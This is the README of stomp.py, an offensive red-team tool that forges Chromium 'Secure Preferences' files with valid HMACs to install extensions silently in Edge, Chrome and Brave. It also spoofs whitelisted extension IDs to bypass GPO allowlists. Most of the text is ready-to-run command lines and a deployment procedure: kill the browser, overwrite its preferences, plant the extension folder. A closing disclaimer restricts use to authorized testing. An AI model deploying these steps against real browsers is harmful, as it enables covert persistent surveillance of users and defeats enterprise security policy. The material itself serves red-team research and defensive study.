# stomp.py

> Inject browser extensions into Chromium-based browsers without the store - with GPO bypass support.

A red team tool for persistent browser-based agent deployment.  
Supports **Windows**, **Linux** and **macOS** targets.

---

## How It Works

Chromium browsers store their configuration, including installed extensions, in a `Secure Preferences` file signed with an HMAC. `stomp.py` generates a valid replacement file that registers an arbitrary extension, with a correctly computed HMAC derived from the target user's SID for Windows or hardware UUID for macOS.

On next browser launch, the extension is loaded silently, no store, no warning dialog, no user interaction required.

---

## Tested Browsers

| Browser | Status |
|---------|--------|
| Microsoft Edge | ✅ Confirmed |
| Google Chrome | ✅ Confirmed |
| Brave | ✅ Confirmed |
| Vivaldi | ✅ Confirmed |
| Opera | ⚠️ Partial (HMAC may differ) |

---

## Requirements

```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

- Python 3.8+
- Target's current `Secure Preferences` file
- Target user's SID (`whoami /user` on Windows)

---

## Usage

### Basic injection

```bash
# Windows target
python3 stomp.py EXTENSION_FOLDER/ \
  --platform windows \
  --prefs-file SecurePreferences \
  --device-id "S-1-5-21-XXX-XXX-XXX-XXX" \
  --target-dir "C:\\Users\\<user>\\AppData\\Local" \
  --browser edge

# macOS target
python3 stomp.py EXTENSION_FOLDER/ \
  --platform darwin \
  --prefs-file SecurePreferences \
  --device-id "S-1-5-21-XXX-XXX-XXX-XXX" \
  --target-dir "/Users/<user>/Library/Application Support" \
  --browser chrome

# Linux target
python3 stomp.py EXTENSION_FOLDER/ \
  --platform linux \
  --prefs-file SecurePreferences \
  --device-id "S-1-5-21-XXX-XXX-XXX-XXX" \
  --target-dir "/home/<user>/.config" \
  --browser brave
```

The `--platform` flag tells `stomp.py` which OS the deployment targets. It adapts:
- **Path separators** — backslashes for Windows, forward slashes for Linux/macOS
- **Browser profile paths** — `AppData\Local\...` vs `Library/Application Support/...` vs `.config/...`
- **Process names** — `chrome.exe` vs `Google Chrome` vs `google-chrome`
- **Injection script** — `inject.bat` on Windows, `inject.sh` on Linux/macOS

### GPO allowlist bypass (`--spoof`)

If the target environment restricts extensions to a GPO whitelist, use `--spoof` to derive the public key of a whitelisted extension from the store — giving your extension the same ID:

```bash
python3 stomp.py EXTENSION_FOLDER/ \
  --spoof <whitelisted_extension_id> \
  --platform windows \
  --prefs-file SecurePreferences \
  --device-id "S-1-5-21-XXX-XXX-XXX-XXX" \
  --target-dir "C:\\Users\\<user>\\AppData\\Local"
```

Whitelisted IDs are visible at `edge://policy` or `chrome://policy`.

### GPO bypass with corporate proxy (`--proxy`)

If you are behind a corporate proxy and cannot access the extension store directly, use `--proxy` to route the CRX download through your proxy:

```bash
python3 stomp.py EXTENSION_FOLDER/ \
  --spoof <whitelisted_extension_id> \
  --proxy http://proxy.corp.com:8080 \
  --platform windows \
  --prefs-file SecurePreferences \
  --device-id "S-1-5-21-XXX-XXX-XXX-XXX" \
  --target-dir "C:\\Users\\<user>\\AppData\\Local"
```

The `--proxy` parameter accepts standard HTTP/HTTPS proxy URLs:
- Basic: `http://proxy.corp.com:8080`
- With authentication: `http://username:password@proxy.corp.com:8080`

**Note:** If you receive a DNS resolution error (`[Errno 11001] getaddrinfo failed`) when running `--spoof`, it likely means your machine is behind a proxy. Check your proxy settings with:
```bash
netsh winhttp show proxy
```

### Options

| Option | Description |
|--------|-------------|
| `--prefs-file` | Path to the target's current `Secure Preferences` |
| `--device-id` | Target user's SID (`whoami /user`) / Target user's UUID (`system_profiler SPHardwareDataType`) |
| `--target-dir` | Deployment root directory on the target machine |
| `--platform` | Target OS: `windows`, `linux`, or `darwin` (default: `windows`) |
| `--spoof <ID>` | Spoof a whitelisted extension ID from the store |
| `--proxy <URL>` | HTTP/HTTPS proxy URL for downloading CRX (e.g. `http://proxy.corp.com:8080`) |
| `--browser` | Target browser: `chrome`, `edge`, `brave`, `vivaldi` (default: `edge`) |
| `--output` | Output directory for the deployment ZIP (default: current directory) |
| `--debug` | Enable verbose debug output |

---

## Output

stomp generates a deployment-ready ZIP archive:

```
output.zip
├── extension/              # Extension folder, ready to copy
├── info.json               # Extension metadata and deployment info
├── inject.bat              # Windows deployment script (or inject.sh on Linux/macOS)
├── Secure Preferences      # Generated Secure Preferences (Edge, Chrome, Brave)
└── SecurePreferencesClean  # Backup of the original Secure Preferences
```

Transfer the ZIP to the target machine and execute the injection script (`inject.bat` on Windows, `inject.sh` on Linux/macOS). The script handles the full deployment sequence:

1. Kill any running browser instance
2. Restore clean `Secure Preferences` to avoid state collisions
3. Open and close the browser to reset internal state
4. Copy the extension folder to the target directory
5. Overwrite `Secure Preferences` with the generated file

### Platform-specific paths

Browser profile paths are automatically adapted to the target OS:

| OS | Chrome profile root | Browser process |
|---|---|---|
| Windows | `%LOCALAPPDATA%\Google\Chrome\User Data\Default` | `chrome.exe` |
| macOS | `~/Library/Application Support/Google/Chrome/Default` | `Google Chrome` |
| Linux | `~/.config/google-chrome/Default` | `google-chrome` |

---

## Extension Structure

Your extension must be a valid Chromium MV3 extension.
Minimum required structure:

```
EXTENSION_FOLDER/
├── manifest.json
├── background.js
└── content.js
```

For GPO bypass, `stomp` automatically injects the correct `key` field in `manifest.json` when using `--spoof`.

---

## Injection Templates

Two templates control the on-target deployment script:

Each target OS has its own template — paths, process control (`taskkill`/`pkill`) and browser launch (`start`/`open`/binary) differ:

| File | Platform | Status |
|------|----------|--------|
| `utils/inject.bat.template` | Windows | ✅ Ready |
| `utils/inject.darwin.sh.template` | macOS | ✅ Ready |
| `utils/inject.linux.sh.template` | Linux | ✅ Ready |

The generated script is always named `inject.bat` (Windows) or `inject.sh` (macOS/Linux) inside the ZIP. When the template for the requested platform is missing, `stomp.py` skips script generation with a clear warning — all other ZIP contents are still produced.

---

## Limitations

- **Initial access required** - stomp must be executed in the context of the target user
- **Extension folder visible on disk** - baseline injection leaves an artifact on the target filesystem
- **SID/UUID required** - needed to compute a valid HMAC (Windows SID / macOS Hardware UUID)
- **State-reset step needs a session** - `inject.sh`/`inject.bat` briefly launch the browser to reset its internal state, so they run in the target user's interactive session
- **Proxy support** - Only HTTP/HTTPS proxies are supported; SOCKS proxies are not supported by `urllib.request`

---

## Disclaimer

This tool is intended for authorized red team operations, security research, and educational purposes only.
Use responsibly and only on systems you have explicit permission to test.

---

## Credits

This work builds on the original [extloader](https://www.synacktiv.com/publications/lextension-fantome-infiltrer-chrome-par-des-voies-inexplorees) research by [Synacktiv](https://www.synacktiv.com).

## Author

**Corentin Mahieu** / [Fir3n0x](https://github.com/Fir3n0x)  
[fir3n0x.github.io](https://fir3n0x.github.io) · [LinkedIn](https://www.linkedin.com/in/corentin-mahieu/)
